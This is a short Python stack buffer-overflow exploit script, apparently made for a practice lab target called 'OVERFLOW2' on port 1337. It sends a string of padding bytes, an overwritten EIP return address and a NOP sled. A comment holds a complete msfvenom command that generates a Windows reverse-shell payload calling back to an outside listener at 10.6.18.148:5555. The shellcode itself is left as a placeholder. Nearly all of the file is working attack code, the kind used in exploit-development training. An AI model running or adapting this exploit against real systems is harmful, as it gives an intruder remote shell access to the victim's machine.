#!/usr/bin/env python3

import socket, time, sys

ip = "RHOST IP"

port = 1337
timeout = 5
prefix = "OVERFLOW2 "
filler = "A" * 634
eip = "\xbb\x11\x50\x62"
nops = "\x90" * 10
# Shikata_ga_nai couldn't encode the payload :(
# msfvenom -p windows/shell_reverse_tcp LHOST=10.6.18.148 LPORT=5555 EXITFUNC=thread -f c  -b "\x00\x23\x3c\x83\xba" 
shell_code = ("Insert msfvenom payload here") 

string = prefix + filler + eip + nops + shell_code



try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(timeout)
    s.connect((ip, port))
    s.recv(1024)
    print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
    s.send(bytes(string, "latin-1"))
    s.recv(1024)
except:
  print("Check your netcat listener")
  sys.exit(0)
